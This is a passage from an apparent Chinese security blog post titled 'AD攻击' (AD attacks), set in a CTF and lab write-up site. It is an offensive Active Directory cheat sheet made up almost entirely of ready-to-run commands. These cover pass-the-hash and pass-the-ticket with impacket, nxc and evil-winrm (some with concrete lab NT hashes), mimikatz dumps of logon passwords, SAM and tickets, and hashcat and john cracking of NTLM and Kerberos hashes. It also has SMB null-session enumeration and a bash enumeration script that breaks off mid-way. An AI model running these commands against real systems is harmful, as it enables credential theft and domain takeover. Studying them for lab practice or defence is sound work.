class="sidebar-cat-post"><a href="/posts/e965f5ec/">thehackerslabs-Curiosity2</a></li><li class="sidebar-cat-post"><a href="/posts/c36651be/">thehackerslabs-Pacharan</a></li><li class="sidebar-cat-post"><a href="/posts/2e40fc49/">thehackerslabs-Chimichurri</a></li><li class="sidebar-cat-post"><a href="/posts/a8a9f8e9/">thehackerslabs-Doraemon</a></li><li class="sidebar-cat-post"><a href="/posts/e23e0315/">thehackerslabs-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">OverTheWire</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dafc866f/">OverTheWire-Bandit</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CVE复现</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/dcc68ae8/">Thinkphp3.2.x命令执行</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnyx</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/20dbae8a/">Vulnyx-Admin</a></li><li class="sidebar-cat-post"><a href="/posts/1a843bca/">Vulnyx-Anon</a></li><li class="sidebar-cat-post"><a href="/posts/c9c80648/">Vulnyx-Eternal</a></li><li class="sidebar-cat-post"><a href="/posts/3a160b8e/">Vulnyx-Experience</a></li><li class="sidebar-cat-post"><a href="/posts/b53d3c5e/">Vulnyx-send</a></li><li class="sidebar-cat-post"><a href="/posts/66723be2/">Vulnyx-tunnel</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Vulnhub</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/a5814cc3/">Vulnhub-64base</a></li><li class="sidebar-cat-post"><a href="/posts/b7e54991/">Vulnhub-Mercy</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">渗透</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/ca796a/">域控-Offensive</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">CTFWP</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/4b74e7f2/">2023WMCTF ez_java_again_rev</a></li><li class="sidebar-cat-post"><a href="/posts/b891edcc/">2023aliyunCTF-Bypassit1</a></li><li class="sidebar-cat-post"><a href="/posts/996ba1d8/">2023巅峰极客BabyURL</a></li><li class="sidebar-cat-post"><a href="/posts/125ab785/">2023羊城杯Ez_java</a></li><li class="sidebar-cat-post"><a href="/posts/c292ee15/">BaseCTF-scxml</a></li><li class="sidebar-cat-post"><a href="/posts/7d623870/">GYCTF2020-Easyphp</a></li><li class="sidebar-cat-post"><a href="/posts/9d1ed1c9/">LitCTF2024个人题解</a></li><li class="sidebar-cat-post"><a href="/posts/bd91e42f/">LitCTF2024未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/91008f23/">VNCTF2025复现</a></li><li class="sidebar-cat-post"><a href="/posts/545cd3ac/">XYCTF个人wp</a></li><li class="sidebar-cat-post"><a href="/posts/7345579c/">XYCTF未解题复现</a></li><li class="sidebar-cat-post"><a href="/posts/2f532906/">网鼎杯2020玄武组SSRFMe</a></li><li class="sidebar-cat-post"><a href="/posts/4cfd8fa8/">DownunderCTf复现</a></li><li class="sidebar-cat-post"><a href="/posts/43176253/">国城杯web复现</a></li><li class="sidebar-cat-post"><a href="/posts/4666d2e/">帕鲁杯my love复现</a></li><li class="sidebar-cat-post"><a href="/posts/92fba657/">某不知名CTF比赛</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">春秋云境</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/b6e8119b/">春秋云境-Brute4Road</a></li><li class="sidebar-cat-post"><a href="/posts/3a283e32/">春秋云境-Certify</a></li><li class="sidebar-cat-post"><a href="/posts/93b35a6e/">春秋云境-Delegation</a></li><li class="sidebar-cat-post"><a href="/posts/952d1a58/">春秋云境-Exchange</a></li><li class="sidebar-cat-post"><a href="/posts/f85c7fea/">春秋云境-Flarum</a></li><li class="sidebar-cat-post"><a href="/posts/f8a60ebc/">春秋云境-GreatWall</a></li><li class="sidebar-cat-post"><a href="/posts/cb0f9c73/">春秋云境-Privilege</a></li><li class="sidebar-cat-post"><a href="/posts/7ea084a1/">春秋云境-Spoofing</a></li><li class="sidebar-cat-post"><a href="/posts/a5238ac2/">春秋云境-ThermalPower</a></li><li class="sidebar-cat-post"><a href="/posts/a0288562/">春秋云境-Tsclient</a></li><li class="sidebar-cat-post"><a href="/posts/3731c1f5/">春秋云境-无间计划</a></li><li class="sidebar-cat-post"><a href="/posts/9aa9ec9/">春秋云境-Time</a></li><li class="sidebar-cat-post"><a href="/posts/beaf5221/">春秋云境-TunnelX</a></li><li class="sidebar-cat-post"><a href="/posts/aa8a0593/">春秋云境-CloudNet</a></li><li class="sidebar-cat-post"><a href="/posts/a3698f4a/">春秋云境-Delivery</a></li><li class="sidebar-cat-post"><a href="/posts/d66aab01/">春秋云境-Hospital</a></li><li class="sidebar-cat-post"><a href="/posts/327fc326/">春秋云境-Initial</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">应急取证</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/22f8a4f5/">2024网鼎杯半决赛安全运营挑战赛</a></li><li class="sidebar-cat-post"><a href="/posts/cc783675/">第一章-应急响应-Linux日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/c8f379ac/">第二章-应急响应-apache日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/9c3ca66c/">webshell查杀</a></li><li class="sidebar-cat-post"><a href="/posts/a04aefa7/">应急加固-医院脱库应急处理</a></li><li class="sidebar-cat-post"><a href="/posts/efc85f7f/">应急靶场-Linux入侵排查</a></li><li class="sidebar-cat-post"><a href="/posts/e0ad1852/">应急响应靶场(1)</a></li><li class="sidebar-cat-post"><a href="/posts/beb16a0d/">应急靶场-mysql应急</a></li><li class="sidebar-cat-post"><a href="/posts/42c3bb70/">日志分析-IIS日志分析</a></li><li class="sidebar-cat-post"><a href="/posts/4844d267/">应急靶场-redis应急</a></li><li class="sidebar-cat-post"><a href="/posts/f79382a3/">第一届&quot;帕鲁杯&quot;wp</a></li><li class="sidebar-cat-post"><a href="/posts/83be2f6e/">第九章-blueteam 的小心思</a></li><li class="sidebar-cat-post"><a href="/posts/28af606d/">第二届帕鲁杯应急响应wp</a></li><li class="sidebar-cat-post"><a href="/posts/bd7d5e3d/">第二届长城杯&amp;CISCN半决赛-应急响应</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">MAZESEC</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/d2450660/">MazeSec-ta0</a></li><li class="sidebar-cat-post"><a href="/posts/24db92f0/">MazeSec-DevOoos</a></li><li class="sidebar-cat-post"><a href="/posts/47da5ee2/">MAZESEC-ajpsrv</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">AD</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/2d21762d/">Kerberos协议</a></li><li class="sidebar-cat-post"><a href="/posts/3e4e3078/">LDAP协议</a></li><li class="sidebar-cat-post"><a href="/posts/b774aeb/">NTLM协议</a></li><li class="sidebar-cat-post"><a href="/posts/d12a1edd/">Linux远程连接RDP</a></li><li class="sidebar-cat-post"><a href="/posts/636860d3/">AD攻击</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">WEB安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/5b4d21b4/">DOM Clobbering</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">HackMyVM-Labs</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/45ea257e/">lab-Temperance</a></li><li class="sidebar-cat-post"><a href="/posts/13a562a7/">HackMyVM-Hades</a></li></ul></details><details class="sidebar-cat-details"><summary class="sidebar-cat-category-name">Web安全</summary><ul class="sidebar-cat-list"><li class="sidebar-cat-post"><a href="/posts/e9731bcd/">Weblogic漏洞</a></li></ul></details></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/636860d3/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">AD攻击</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2025-07-29 12:58:27" itemprop="dateCreated datePublished" datetime="2025-07-29T12:58:27+08:00">2025-07-29</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">14.9k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">66m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/AD/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">AD</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/windows/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">windows</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="Linux远程连接RDP"><a href="#Linux远程连接RDP" class="headerlink" title="Linux远程连接RDP"></a><strong>Linux远程连接RDP</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Using hostname or FQDN</span>
+xfreerdp3 /v:win10ent1.ad.lab /u:<span class="token string">'john.doe'</span> /p:<span class="token string">'P@$$word123!'</span>
+
+<span class="token comment"># Using an IP address</span>
+xfreerdp3 /v:10.80.80.3 /u:<span class="token string">'john.doe'</span> /p:<span class="token string">'P@$$word123!'</span></code></pre>
+
+<h2 id="pass-the-hash"><a href="#pass-the-hash" class="headerlink" title="pass the hash"></a><strong>pass the hash</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">psexec.py xiaorang.lab/administrator@DC-PROGAME.xiaorang.lab <span class="token parameter variable">-hashes</span> :04d93ffd6f5f6e4490e0de23f240a5e9 -target-ip <span class="token number">172.22</span>.6.12  <span class="token parameter variable">-codec</span> gbk
+
+wmiexec.py <span class="token parameter variable">-hashes</span> :c3cfdc08527ec4ab6aa3e630e79d349b Administrator@172.22.60.8</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">nxc smb <span class="token operator">&lt;</span>target-or-CIDR<span class="token operator">></span> <span class="token parameter variable">-d</span> <span class="token string">'domain.tld'</span> <span class="token parameter variable">-u</span> <span class="token string">"username"</span> <span class="token parameter variable">-H</span> NT_HASH <span class="token comment">#域内账户</span>
+
+nxc smb <span class="token operator">&lt;</span>target-or-CIDR<span class="token operator">></span> <span class="token parameter variable">-u</span> <span class="token string">"username"</span> <span class="token parameter variable">-H</span> NT_HASH --local-auth <span class="token comment">#本地账户</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">impacket-smbexec <span class="token parameter variable">-hashes</span> <span class="token string">':NT_HASH'</span> <span class="token string">'domain.tld/username@target'</span>
+
+impacket-wmiexec <span class="token parameter variable">-hashes</span> lm-hash:nt-hash <span class="token string">'domain.tld/username@target'</span> cmd.exe
+
+impacket-psexec <span class="token parameter variable">-hashes</span> lm-hash:nt-hash <span class="token string">'domain.tld/username@target'</span> cmd.exe</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">evil-winrm <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span>target_ip<span class="token operator">></span> <span class="token parameter variable">-u</span> username <span class="token parameter variable">-H</span> <span class="token operator">&lt;</span>hash<span class="token operator">></span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-U</span> <span class="token string">'AD.LAB/john.doe%NT_HASH'</span> --pw-nt-hash <span class="token parameter variable">-L</span> //filesrv01.ad.lab</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">impacket-getTGT -dc-ip <span class="token number">10.80</span>.80.2 <span class="token parameter variable">-hashes</span> :NT_HASH_HERE <span class="token string">'ad.lab/john.doe'</span>@DC01.ad.lab</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">secretsdump.py soupedecode.local/<span class="token string">'DC01$'</span>@192.168.56.126 <span class="token parameter variable">-hashes</span> :967fdb37b05f099f6659ab8196ec4db1</code></pre>
+
+<h2 id="pass-the-password"><a href="#pass-the-password" class="headerlink" title="pass the password"></a><strong>pass the password</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">nxc smb <span class="token operator">&lt;</span>target-or-CIDR<span class="token operator">></span> <span class="token parameter variable">-d</span> <span class="token string">'domain.tld'</span> <span class="token parameter variable">-u</span> username <span class="token parameter variable">-p</span> password
+
+nxc smb <span class="token operator">&lt;</span>target-or-CIDR<span class="token operator">></span> --local-auth <span class="token parameter variable">-u</span> username <span class="token parameter variable">-p</span> password</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">impacket-smbexec <span class="token string">'domain.tld/user.name:password@target'</span>
+
+impacket-wmiexec <span class="token string">'domain.tld/user.name:password@target'</span> cmd.exe
+
+impacket-psexec <span class="token string">'domain.tld/user.name:password@target'</span> cmd.exe
+
+impacket-secretsdump <span class="token string">'domain.tld/user.name:password@target'</span>
+
+evil-winrm <span class="token parameter variable">-i</span> <span class="token operator">&lt;</span>target_ip<span class="token operator">></span> <span class="token parameter variable">-u</span> username <span class="token parameter variable">-p</span> password</code></pre>
+
+<h2 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a><strong>pass the ticket</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz <span class="token comment"># sekurlsa::tickets /export</span>
+kerberos::ptt <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span>ca99f8<span class="token punctuation">]</span>-2-0-40e10000-t1_toby.beck@krbtgt-ZA.TRYHACKME.COM.kirbi</code></pre>
+
+
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">impacket-getST <span class="token parameter variable">-spn</span> <span class="token string">'cifs/DC.hackme.thl'</span> <span class="token parameter variable">-impersonate</span> <span class="token string">'administrator'</span> <span class="token string">'hackme.thl/GMSA_SVC$'</span> <span class="token parameter variable">-hashes</span> :8d87cacb244ca64c1f67c691e1adf124  -dc-ip <span class="token number">192.168</span>.56.8 
+
+<span class="token builtin class-name">export</span> <span class="token assign-left variable">KRB5CCNAME</span><span class="token operator">=</span>administrator@cifs_DC.hackme.thl@HACKME.THL.ccache 
+psexec.py hackme.thl/administrator@DC.hackme.thl <span class="token parameter variable">-k</span> -no-pass -target-ip <span class="token number">192.168</span>.56.8</code></pre>
+
+<h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a><strong>mimikatz</strong></h2><p>dump 哈希</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz <span class="token comment"># privilege::debug</span>
+mimikatz <span class="token comment"># token::elevate</span>
+mimikatz <span class="token comment"># sekurlsa::logonpasswords</span></code></pre>
+
+<p>dump SAM</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz <span class="token comment"># privilege::debug</span>
+mimikatz <span class="token comment"># token::elevate</span>
+mimikatz <span class="token comment"># lsadump::sam</span></code></pre>
+
+<p>dump TGT</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">mimikatz <span class="token comment"># privilege::debug</span>
+mimikatz <span class="token comment"># token::elevate</span>
+mimikatz <span class="token comment"># sekurlsa::tickets</span></code></pre>
+
+<h2 id="哈希碰撞"><a href="#哈希碰撞" class="headerlink" title="哈希碰撞"></a><strong>哈希碰撞</strong></h2><p>LM</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--format</span><span class="token operator">=</span>lm hash.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt
+hashcat <span class="token parameter variable">-m</span> <span class="token number">3000</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt  /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>NT</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--format</span><span class="token operator">=</span>nt hash.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt
+hashcat <span class="token parameter variable">-m</span> <span class="token number">1000</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>NTLM v1</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--format</span><span class="token operator">=</span>netntlm hash.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt
+hashcat <span class="token parameter variable">-m</span> <span class="token number">1000</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>NTLM v2</p>
+<pre class="language-BASH" data-language="BASH"><code class="language-BASH">john --format&#x3D;netntlmv2 hash.txt --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt
+hashcat -m 5600 -a 0 hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</code></pre>
+
+<p>Kerberos 5 TGS ($krb5tgs$23$…)</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">john <span class="token parameter variable">--format</span><span class="token operator">=</span>krb5tgs hash.txt <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt
+hashcat <span class="token parameter variable">-m</span> <span class="token number">13100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>Kerberos 5 TGS AES128 ($krb5tgs$17…)</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">19600</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>Kerberos ASREP ($krb5asrep$23…)</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">18200</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>MSCache 2 (very slow) ($DCC2$10240…)</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">2100</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+<p>Timeroast hash ($sntp-ms$…)</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">31300</span> <span class="token parameter variable">-a</span> <span class="token number">3</span> hash.txt <span class="token parameter variable">-w</span> <span class="token number">3</span> ?l?l?l?l?l?l?l</code></pre>
+
+<p>pxe hash ($sccm$aes128$…)</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">hashcat <span class="token parameter variable">-m</span> <span class="token number">19850</span> <span class="token parameter variable">-a</span> <span class="token number">0</span> hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+
+
+<h2 id="内网扫描"><a href="#内网扫描" class="headerlink" title="内网扫描"></a><strong>内网扫描</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">cme smb <span class="token number">192.168</span>.31.1/24 <span class="token comment">#枚举开放smb服务的主机</span>
+nmap <span class="token parameter variable">-sP</span> <span class="token parameter variable">-p</span> <span class="token number">192.168</span>.31.34 <span class="token comment"># ping扫描</span>
+nmap <span class="token parameter variable">-PN</span> <span class="token parameter variable">-sV</span> --top-ports <span class="token number">50</span> <span class="token parameter variable">--open</span> <span class="token number">192.168</span>.31.34
+nmap <span class="token parameter variable">-PN</span> <span class="token parameter variable">--script</span> smb-vuln* -p139,445 <span class="token number">192.168</span>.31.34
+nmap <span class="token parameter variable">-PN</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-oA</span> out.txt <span class="token number">192.168</span>.31.34 <span class="token comment">#完全扫描</span>
+nmap <span class="token parameter variable">-sU</span> <span class="token parameter variable">-sC</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-oA</span> out.txt <span class="token number">192.168</span>.31.34 <span class="token comment"># udp扫描</span></code></pre>
+
+<h2 id="寻找域控ip"><a href="#寻找域控ip" class="headerlink" title="寻找域控ip"></a><strong>寻找域控ip</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">nmcli dev show eth0 <span class="token comment">#显示域名/DNS名称</span>
+<span class="token function">nslookup</span> <span class="token parameter variable">-type</span><span class="token operator">=</span>SRV _ldap._tcp.dc._msdsc.<span class="token operator">&lt;</span>domian<span class="token operator">></span></code></pre>
+
+
+
+<h2 id="SMB上共享的访客访问权限"><a href="#SMB上共享的访客访问权限" class="headerlink" title="SMB上共享的访客访问权限"></a><strong>SMB上共享的访客访问权限</strong></h2><pre class="language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token parameter variable">-a</span> <span class="token parameter variable">-u</span> <span class="token string">""</span> <span class="token parameter variable">-p</span> <span class="token string">""</span> dc-ip <span class="token operator">&amp;&amp;</span> enum4linux <span class="token parameter variable">-a</span> <span class="token parameter variable">-u</span> <span class="token string">"guest"</span> <span class="token parameter variable">-p</span> <span class="token string">""</span>  <span class="token parameter variable">-P</span> <span class="token number">445</span> <span class="token parameter variable">-H</span> dc-ip</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">smbmap <span class="token parameter variable">-u</span> <span class="token string">""</span> <span class="token parameter variable">-p</span> <span class="token string">""</span> <span class="token parameter variable">-P</span> <span class="token number">445</span> <span class="token parameter variable">-H</span> dc-ip <span class="token operator">&amp;&amp;</span> smbmap <span class="token parameter variable">-u</span> <span class="token string">"guest"</span> <span class="token parameter variable">-p</span> <span class="token string">""</span> <span class="token parameter variable">-P</span> <span class="token number">445</span> <span class="token parameter variable">-H</span> dc-ip
+smbmap <span class="token parameter variable">-H</span> <span class="token number">192.168</span>.31.34 <span class="token parameter variable">-R</span> <span class="token variable">$sharename</span>  <span class="token comment">#指定共享目录</span>
+</code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token parameter variable">-U</span> <span class="token string">'%'</span> <span class="token parameter variable">-L</span> //192.168.31.34 <span class="token operator">&amp;&amp;</span> smbclient <span class="token parameter variable">-U</span> <span class="token string">'guest%'</span> <span class="token parameter variable">-L</span> //192.168.31.34
+smbclient <span class="token parameter variable">-L</span> <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.1.101<span class="token punctuation">\</span><span class="token punctuation">\</span>    <span class="token comment">#列出所有共享</span>
+smbclient //HOST/<span class="token environment constant">PATH</span> <span class="token parameter variable">-c</span> <span class="token string">'recurse;ls'</span>  <span class="token comment">#递归列出目录下所有文件</span>
+smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.1.101<span class="token punctuation">\</span><span class="token punctuation">\</span>C$         <span class="token comment">#连接到共享</span>
+smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.1.101<span class="token punctuation">\</span><span class="token punctuation">\</span>C$  <span class="token parameter variable">-N</span>     <span class="token comment">#匿名连接</span>
+smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.1.101<span class="token punctuation">\</span><span class="token punctuation">\</span>C$ <span class="token parameter variable">--option</span><span class="token operator">=</span><span class="token string">'client min protocol=NT1'</span> <span class="token comment">#同上</span>
+smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.1.101<span class="token punctuation">\</span><span class="token punctuation">\</span>admin$ <span class="token parameter variable">-U</span> t-skid  <span class="token comment">#指定用户连接</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">cme smb <span class="token number">192.168</span>.31.34 <span class="token parameter variable">-u</span> <span class="token string">''</span> <span class="token parameter variable">-p</span> <span class="token string">''</span> <span class="token comment">#枚举空会话</span>
+cme smb <span class="token number">192.168</span>.31.34 <span class="token parameter variable">-u</span> <span class="token string">'a'</span> <span class="token parameter variable">-p</span> <span class="token string">''</span> <span class="token comment">#枚举匿名访问</span></code></pre>
+
+<pre class="language-bash" data-language="bash"><code class="language-bash">rpcclient <span class="token parameter variable">-U</span> <span class="token string">""</span> <span class="token operator">&lt;</span>ip<span class="token operator">></span>  <span class="token comment">#smb空会话连接，现在启用空会话的主机不常见，但值得一试</span>
+rpcclient <span class="token parameter variable">-U</span> Whisky%Ignite@MamasoyStream2er@ <span class="token number">192.168</span>.69.69
+rpcclient<span class="token operator">></span>srvinfo
+rpcclient<span class="token operator">></span>enumdomusers
+rpcclient<span class="token operator">></span>getdompwinfo</code></pre>
+
+<p>SMB枚举脚本</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+<span class="token assign-left variable">IFACE</span><span class="token operator">=</span><span class="token string">"eth0"</span>
+<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$#</span> <span class="token parameter variable">-eq</span> <span class="token number">0</span> <span class="token punctuation">]</span>
+    <span class="token keyword">then</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">"Usage: <span class="token variable">$0</span> &lt;IP>"</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">"eg: <span class="token variable">$0</span> 10.10.10.10"</span>
+        <span class="token builtin class-name">exit</span>
+    <span class="token keyword">else</span>
+        <span class="token assign-left variable">IP</span><span class="token operator">=</span><span class="token string">"<span class="token variable">$1</span>"</span>
+<span class="token keyword">fi</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Getting Netbios name ##########"</span>
+nbtscan <span class="token parameter variable">-v</span> <span class="token parameter variable">-h</span> <span class="token variable">$IP</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Checking for NULL sessions ##########"</span>
+<span class="token assign-left variable">output</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"echo 'srvinfo' | rpcclient <span class="token variable">$IP</span> -U%"</span><span class="token variable">`</span></span>
+<span class="token builtin class-name">echo</span> <span class="token variable">$output</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Enumerating domains ##########"</span>
+<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"echo 'enumdomains' | rpcclient <span class="token variable">$IP</span> -U%"</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Enumerating password and lockout policies ##########"</span>
+polenum <span class="token variable">$IP</span>
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Enumerating users ##########"</span>
+nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-T4</span> <span class="token parameter variable">-sS</span> -p139,445 <span class="token parameter variable">--script</span><span class="token operator">=</span>smb-enum-users <span class="token variable">$IP</span>
+<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"echo 'enumdomusers' | rpcclient <span class="token variable">$IP</span> -U%"</span>
+<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">"echo 'enumdomusers' | rpcclient <span class="token variable">$IP</span> -U%"</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token punctuation">[</span> <span class="token parameter variable">-f2</span> <span class="token operator">|</span> <span class="token function">cut</span> -d<span class="token punctuation">]</span> <span class="token parameter variable">-f1</span> <span class="token operator">></span> /tmp/<span class="token variable">$IP</span>-users.txt
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Enumerating Administrators ##########"</span>
+net rpc group members <span class="token string">"Administrators"</span> <span class="token parameter variable">-I</span> <span class="token variable">$IP</span> -U%
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>########## Enumerating Domain Admins ##########"</span>
